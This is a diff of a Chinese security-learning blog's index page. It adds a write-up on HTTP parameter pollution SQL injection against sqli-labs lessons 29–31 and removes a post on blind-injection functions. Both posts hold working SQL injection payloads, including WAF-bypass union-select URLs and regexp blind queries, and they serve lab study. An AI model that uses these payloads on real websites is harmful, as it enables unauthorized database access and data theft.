@@ -64,6 +64,137 @@
       <div id="main" class="wrapper">
         <div id="primary" class="site-content"><div id="content" role="main">
   
+    <article id="post-SQL注入-HPP" class="post-SQL注入-HPP post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        
+  
+    <h1 class="entry-title">
+      <a class="article-title" href="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-HPP/">SQL注入-HPP</a>
+    </h1>
+  
+
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/10/SQL%E6%B3%A8%E5%85%A5-HPP/" data-id="ckzgn980m00055cma51w88mj0" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <p>##服务器两层架构</p>
+<p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-HPP/image-20220210131503726.png" alt="image-20220210131503726"></p>
+<p>服务器端有两个部分：第一部分为 tomcat 为引擎的 jsp 型服务器，第二部分为 apache为引擎的 php 服务器，真正提供 web 服务的是 php 服务器。工作流程为：client 访问服务器， 能直接访问到 tomcat 服务器，然后 tomcat 服务器再向 apache 服务器请求数据。数据返回路径则相反。</p>
+<p><strong>大多数服务器对于参数解析的介绍：</strong></p>
+<table>
+<thead>
+<tr>
+<th align="center">Web服务器</th>
+<th align="center"><strong>参数获取函数</strong></th>
+<th align="center"><strong>获取到的参数</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">PHP/Apache</td>
+<td align="center">$_GET(“par”)</td>
+<td align="center">Last</td>
+</tr>
+<tr>
+<td align="center">JSP/Tmocat</td>
+<td align="center">Request.getParameter(“par”)</td>
+<td align="center">First</td>
+</tr>
+<tr>
+<td align="center">Perl(CGI)/Apache</td>
+<td align="center">Param(“par”)</td>
+<td align="center">First</td>
+</tr>
+<tr>
+<td align="center">Python/Apache</td>
+<td align="center">getvalue(“par”)</td>
+<td align="center">All(List)</td>
+</tr>
+<tr>
+<td align="center">ASP/IIS</td>
+<td align="center">Request.QueryString(“par”)</td>
+<td align="center">All(comma-delimited string)</td>
+</tr>
+</tbody></table>
+<h2 id="HTTP参数处理"><a href="#HTTP参数处理" class="headerlink" title="HTTP参数处理"></a>HTTP参数处理</h2><p>在与服务器进行交互的过程中，客户端往往会在GET/POST请求中带上参数。通常在一个请求中，同名参数只会出现一次，但是在HTTP协议中是允许同名参数多次出现的。</p>
+<p>例：对于<code>index.jsp?id=1&amp;id=2</code>请求</p>
+<p>对于上图服务器配置情况，客户端请求首先过 tomcat，tomcat 解析第一个参数，接下来 tomcat 去请求 apache（php） 服务器，apache 解析最后一个参数。返回的数据也就是 apache 处理的数据，id=2。</p>
+<h2 id="HTTP参数污染（HPP）"><a href="#HTTP参数污染（HPP）" class="headerlink" title="HTTP参数污染（HPP）"></a>HTTP参数污染（HPP）</h2><p>由于服务器两层架构，往往tomcat服务器进行数据的过滤和处理，功能类似为一个WAF，通常利用此特性进行WAF绕过。</p>
+<hr>
+<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>记录一下Less-29–Less-31靶场的HPP</p>
+<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p><strong>Less-29</strong></p>
+<p>首先Less-29也是弄了好长时间，也看了很多文章，由于是基于HPP的靶场，最重要的就是没有搭建Tomcat+Java+Mysql的环境，开始弄了好久。（最好是搭建好环境玩Less-29的靶场）</p>
+<p>首先需要打开login.php文件，不然这Less-29和Less-1没什么区别</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-29/login.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-HPP/image-20220210144543097.png" alt="image-20220210144543097"></p>
+<p>判断注入点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-29/login.php?id=1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>这是提示赶走这个愚蠢的黑客，WAF成功阻拦攻击。</p>
+<p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-HPP/image-20220210144634455.png" alt="image-20220210144634455"></p>
+<p>（这里若搭建好Tomcat+Java+Mysql环境的话如下图：）</p>
+<p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-HPP/image-20220210144917098.png" alt="image-20220210144917098"></p>
+<p>从跳转到<code>.jsp</code>页面可以看出来是 Tomcat 服务器，一般来说，现在没有拿 jsp 写后台的了，大都用 php ，我们果断猜测是双服务器。（从这里才能判断这是双服务器）</p>
+<p>参考原文：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/li2019/p/12378585.html">https://www.cnblogs.com/li2019/p/12378585.html</a></p>
+<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>这里已经知道第一个接收第一个参数的服务器是tomcat，接下来要构造payload进行绕过WAF。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-29/login.php?id=1&amp;id=2</span><br></pre></td></tr></table></figure>
+
+<p>可以看到页面回显的是第二个用户名和密码，此时接收参数的服务器是apache，接受了id=2</p>
+<p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-HPP/image-20220210145231054.png" alt="image-20220210145231054"></p>
+<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>判断字段数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-29/login.php?id=1&amp;id=2&#x27; order by 4--+</span><br></pre></td></tr></table></figure>
+
+<p>由于对id值的处理需要<code>&#39;</code>，所以第二个参数需要进行单引号闭合</p>
+<p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-HPP/image-20220210145744817.png" alt="image-20220210145744817"></p>
+<p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-HPP/image-20220210145819240.png" alt="image-20220210145819240"></p>
+<p>判断回显点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-29/login.php?id=1&amp;id=-2&#x27; union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-HPP/image-20220210150050418.png" alt="image-20220210150050418"></p>
+<p>后续过程的payload与以往相同。</p>
+<hr>
+<h2 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h2><p><strong>Less-30</strong></p>
+<p>Less-30与Less-29原理相同，只是对id值做了<code>&quot;</code>处理。</p>
+<p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-HPP/image-20220210150434136.png" alt="image-20220210150434136"></p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-30/login.php?id=1&amp;id=2</span><br><span class="line">http://sqli-labs-master/Less-30/login.php?id=1&amp;id=2&quot; order by 4--+</span><br><span class="line">http://sqli-labs-master/Less-30/login.php?id=1&amp;id=-2&quot; union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="0x01-2"><a href="#0x01-2" class="headerlink" title="0x01"></a>0x01</h2><p><strong>Less-31</strong></p>
+<p>Less-31对id值进行了<code>&quot;)</code>的处理。</p>
+<p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-HPP/image-20220210150938265.png" alt="image-20220210150938265"></p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-31/login.php?id=1&amp;id=2</span><br><span class="line">http://sqli-labs-master/Less-31/login.php?id=1&amp;id=2&quot;) order by 4--+</span><br><span class="line">http://sqli-labs-master/Less-31/login.php?id=1&amp;id=-2&quot;) union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-HPP/">
+    <time datetime="2022-02-10T05:11:20.000Z" class="entry-date">
+        2022-02-10
+    </time>
+</a>
+    
+    
+    </footer>
+</article>
+
+
+
+
+
+
+  
     <article id="post-POST注入-二次注入" class="post-POST注入-二次注入 post type-post status-publish format-standard hentry">
     <!---->
 
@@ -79,7 +210,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/09/POST%E6%B3%A8%E5%85%A5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/" data-id="ckzf9ayjw0003gkma8p0x2yfb" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/09/POST%E6%B3%A8%E5%85%A5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/" data-id="ckzgn980l00035cma2egq581g" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -146,7 +277,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/" data-id="ckzf9ayjy0007gkmac34z1eg8" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/" data-id="ckzgn980o00085cmab4oshnv6" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -417,7 +548,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/07/SQL%E6%B3%A8%E5%85%A5-Oracle%E7%AD%89%E6%B3%A8%E5%85%A5/" data-id="ckzf9ayjy0006gkmabcr19kmr" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/07/SQL%E6%B3%A8%E5%85%A5-Oracle%E7%AD%89%E6%B3%A8%E5%85%A5/" data-id="ckzgn980o00075cma0k1t1mwr" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -596,7 +727,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/" data-id="ckzf9ayjx0005gkma9tfghppm" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/" data-id="ckzgn980k00025cma0o975s6q" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -774,7 +905,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/05/POST%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8EPassword%E7%9A%84%E6%B3%A8%E5%85%A5/" data-id="ckzf9ayjv0002gkma0e62fgnr" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/05/POST%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8EPassword%E7%9A%84%E6%B3%A8%E5%85%A5/" data-id="ckzgn980m00045cma52v4a9q2" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -859,7 +990,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/" data-id="ckzf9ayjz0008gkma26kpbnz5" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/" data-id="ckzgn980p00095cma2ndxdwth" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -1017,7 +1148,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/04/SQL%E6%B3%A8%E5%85%A5-Less8-Less10/" data-id="ckzf9ayjw0004gkma3k01ds05" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/04/SQL%E6%B3%A8%E5%85%A5-Less8-Less10/" data-id="ckzgn980n00065cma6unkerie" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -1072,7 +1203,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/03/%E6%96%87%E4%BB%B6%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA-SQL%E9%9D%B6%E5%9C%BA/" data-id="ckzf9aykf000pgkmafmi0536f" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/03/%E6%96%87%E4%BB%B6%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA-SQL%E9%9D%B6%E5%9C%BA/" data-id="ckzgn9811000p5cma9atcc928" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -1143,7 +1274,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/" data-id="ckzf9aykg000rgkmaate1ckng" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/" data-id="ckzgn9812000s5cmag7pza9b9" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -1426,115 +1557,6 @@
 
 
   
-    <article id="post-SQL注入-盲注" class="post-SQL注入-盲注 post type-post status-publish format-standard hentry">
-    <!---->
-
-      <header class="entry-header">
-        
-        
-  
-    <h1 class="entry-title">
-      <a class="article-title" href="/2022/02/02/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/">SQL注入-盲注</a>
-    </h1>
-  
-
-        
-        <div class="comments-link">
-            
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/02/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/" data-id="ckzf9ayk0000agkma2m898p1c" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
-        </div><!-- .comments-link -->
-      </header><!-- .entry-header -->
-
-    <div class="entry-content">
-      
-        <h2 id="SQL盲注概述"><a href="#SQL盲注概述" class="headerlink" title="SQL盲注概述"></a>SQL盲注概述</h2><p><strong>盲注，通俗易懂一点，就是在页面没有提供明显信息的情况执行的注入方式。</strong></p>
-<p>1.如果数据库运行返回结果时只反馈对错不会返回数据库中的信息 此时可以采用逻辑判断是否正确的          盲注来获取信息。<br>2.盲注是不能通过直接显示的途径来获取数据库数据的方法。</p>
-<h2 id="盲注的分类"><a href="#盲注的分类" class="headerlink" title="盲注的分类"></a>盲注的分类</h2><p>1、布尔盲注</p>
-<p>2、时间盲注</p>
-<p>3、报错型盲注</p>
-<h2 id="SQL盲注常用的函数"><a href="#SQL盲注常用的函数" class="headerlink" title="SQL盲注常用的函数"></a>SQL盲注常用的函数</h2><p>1、length()：返回字符串的长度</p>
-<p>2、substr(string,start,length)：</p>
-<ul>
-<li>substr中的pos从1开始计数</li>
-<li>substr中的len把当前位置当作第一个</li>
-</ul>
-<p>（第一个参数string为要处理的字符串，start为开始位置，length为截取的长度）</p>
-<p>如图：截取字符串’abcde’，从第二个位置开始，截取长度为1的子串，为b。</p>
-<p><img src="/2022/02/02/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/image-20220202152925950.png" alt="image-20220202152925950"></p>
-<p><strong>举例：</strong></p>
-<p>(1) substr(DATABASE(),1,1)&gt;’a’,查看数据库名第一位，substr(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符。</p>
-<p>(2) substr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)&gt;’a’此处string参数可以为sql语句，可自行构造sql语句进行注入。</p>
-<p>3、mid():用法与substr()完全相同。</p>
-<p><strong>举例：</strong></p>
-<p>（1）MID(DATABASE(),1,1)&gt;’a’,查看数据库名第一位，MID(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符。</p>
-<p>（2）MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)&gt;’a’此处column_name参数可以为sql语句，可自行构造sql语句进行注入。</p>
-<p>4、ascii()：查询ascii码中对应的值：</p>
-<p><img src="/2022/02/02/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/image-20220202153644458.png" alt="image-20220202153644458"></p>
-<p>5、count()：统计记录的数量：</p>
-<p><img src="/2022/02/02/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/image-20220202154416535.png" alt="image-20220202154416535"></p>
-<p><img src="/2022/02/02/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/image-20220202154614895.png" alt="image-20220202154614895"></p>
-<p>6、if(condition,a,b)：如果condition为true,返回a,否则返回b</p>
-<p><img src="/2022/02/02/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/image-20220202154906058.png" alt="image-20220202154906058"></p>
-<p>7、sleep()：延迟几秒</p>
-<p><img src="/2022/02/02/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/image-20220202155029469.png" alt="image-20220202155029469"></p>
-<p>8、left()：得到字符串左部指定个数的字符</p>
-<p>left(string,n)：string为要截取的字符串，n为长度</p>
-<p><strong>举例：</strong></p>
-<p>(1) left(database(),1)&gt;’a’,查看数据库名第一位，left(database(),2)&gt;’ab’,查看数据库名前二位。</p>
-<p>(2) 同样的string可以为自行构造的sql语句。</p>
-<p>9、ORD()：返回第一个字符的ASCII码，经常与上面的函数进行组合使用。</p>
-<p><strong>例如：</strong></p>
-<p>ORD(MID(DATABASE(),1,1))&gt;114 意为检测database()的第一位ASCII码是否大于114，也即是‘r’</p>
-<p>10、regexp 正则注入：</p>
-<p><img src="/2022/02/02/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/image-20220202160832282.png" alt="image-20220202160832282"></p>
-<p>当正确的时候显示结果为 1，不正确的时候显示结果为0。</p>
-<p><strong>示例介绍：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> I select * from users where id=1 and 1=(if((user() regexp &#x27;^r&#x27;),1,0)); </span><br><span class="line"></span><br><span class="line">II select * from users where id=1 and 1=(user() regexp&#x27;^ri&#x27;); 通过 if 语句的条件判断，返回一些条件句，比如 if 等构造一个判断。根据返回结果是否等 于 0 或者 1 进行判断。 </span><br><span class="line"></span><br><span class="line">III select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema=&#x27;security&#x27; and table_name regexp &#x27;^us[a-z]&#x27; limit 0,1); 这里利用 select 构造了一个判断语句。我们只需要更换 regexp 表达式即可 &#x27;^u[a-z]&#x27; -&gt; &#x27;^us[a-z]&#x27; -&gt; &#x27;^use[a-z]&#x27; -&gt; &#x27;^user[a-z]&#x27; -&gt; FALSE</span><br></pre></td></tr></table></figure>
-
-<p>正则注入介绍：<a target="_blank" rel="noopener" href="http://www.cnblogs.com/lcamry/articles/5717442.html">http://www.cnblogs.com/lcamry/articles/5717442.html</a></p>
-<p>11、like匹配注入：和上述的正则类似，mysql 在匹配的时候我们可以用 ike 进行匹配。</p>
-<p>​        用法：select user() like ‘ro%’;结果正确返回1，错误返回0。</p>
-<p><img src="/2022/02/02/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/image-20220202161357929.png" alt="image-20220202161357929"></p>
-<p>12、floor()，其功能是“向下取整”，或者说“向下舍入”、“向零取舍”，即取不大于x的最大整数。其主要用于报错盲注中的函数。</p>
-<p>13、rand函数：可以产生一个0–1之间的随机数；配合floor()构造 payload。当rand()有了参数之后，他会对所查询的每条数据产生一个随机数，但是从时间角度看每次给的随机数值是一样的，所以这个随机数是可以预测的，也叫伪随机数。如图：</p>
-<p><img src="/2022/02/02/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/image-20220202163408808.png" alt="image-20220202163408808"></p>
-<p><img src="/2022/02/02/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/image-20220202163503270.png" alt="image-20220202163503270"></p>
-<p>*<em>14、floor()配合rand()使用：floor(rand(1)<em>2)；</em></em></p>
-<p><strong>rand()返回的是0到1之间的随机数，乘2是为了让他返回0到2之间的随机数，组合floor()的取整，这里返回的值只能是0和1；</strong></p>
-<p><img src="/2022/02/02/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/image-20220202163820155.png" alt="image-20220202163820155"></p>
-<p>15、groud by：对数据进行分组。配合rand()和floor()使用。</p>
-<p><img src="/2022/02/02/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/image-20220202165654327.png" alt="image-20220202165654327"></p>
-<p>16、<strong>updatexml() 函数</strong>：改变文档中符合条件的节点的值。<br>        Updatexml(xml_documnet,XPath_string,new_value)；<br>        第一个参数：XML_document是string格式，为XML文档对象的名称<br>        第二个参数：XPath_string(Xpath格式的字符串)<br>        第三个参数：new_value，string格式，替换查找到的符合条件的数据超过长度可以配合      substr()。</p>
-<p>17、<strong>extractvalue()函数：</strong>配合updatexml() 进行时间盲注。</p>
-<p>extractvalue (XML_document, XPath_string); </p>
-<p>第一个参数：XML_document是String格式，为XML文档对象的名称，<br>第二个参数：XPath_string (<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Xpath&spm=1001.2101.3001.7020">Xpath</a>格式的字符串).<br>作用：从目标XML中返回包含所查询值的字符串</p>
-<hr>
-<p>##基于布尔SQL盲注—-构造逻辑判断</p>
-<p>布尔盲注主要基于返回的结果来来进行注入；</p>
-<p>通常利用left()，ascii()，ORD()，regexp，like等数据库关键字根据返回的逻辑值去判断数据库或者其他字段的名字。</p>
-<h2 id="基于报错的SQL盲注—-构造payload-让信息通过错误提示回显出来"><a href="#基于报错的SQL盲注—-构造payload-让信息通过错误提示回显出来" class="headerlink" title="基于报错的SQL盲注—-构造payload 让信息通过错误提示回显出来"></a>基于报错的SQL盲注—-构造payload 让信息通过错误提示回显出来</h2><p>通常利用concat()，floor()，rand()函数构造payload注入，爆出数据库名字或其他关键字段。</p>
-<h2 id="基于时间的-SQL-盲注———-延时注入"><a href="#基于时间的-SQL-盲注———-延时注入" class="headerlink" title="基于时间的 SQL 盲注———-延时注入"></a>基于时间的 SQL 盲注———-延时注入</h2><p>原理：某些查询不需要返回结果的，仅判断查询语句是否正确执行即可，可以使用sleep来进行时间盲注，取页面执行时间(结束时间-开始时间)来判断sleep函数是否正常执行，所以其是否正常执行可以看到一个布尔值，正常为True 报错False。<strong>本质是利用插入的sql语句执行造成时间延迟</strong></p>
-
-      
-    </div><!-- .entry-content -->
-
-    <footer class="entry-meta">
-    <a href="/2022/02/02/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/">
-    <time datetime="2022-02-02T07:08:10.000Z" class="entry-date">
-        2022-02-02
-    </time>
-</a>
-    
-    
-    </footer>
-</article>
-
-
-
-
-
-
-  
   
     <nav id="pagination">
       <nav id="page-nav">
@@ -1564,6 +1586,10 @@
       <ul>
         
           <li>
+            <a href="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-HPP/">SQL注入-HPP</a>
+          </li>
+        
+          <li>
             <a href="/2022/02/09/POST%E6%B3%A8%E5%85%A5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/">POST注入-二次注入</a>
           </li>
         
@@ -1577,10 +1603,6 @@
         
           <li>
             <a href="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/">POST注入-HTTP头注入</a>
-          </li>
-        
-          <li>
-            <a href="/2022/02/05/POST%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8EPassword%E7%9A%84%E6%B3%A8%E5%85%A5/">POST注入--基于Password的注入</a>
           </li>
         
       </ul>
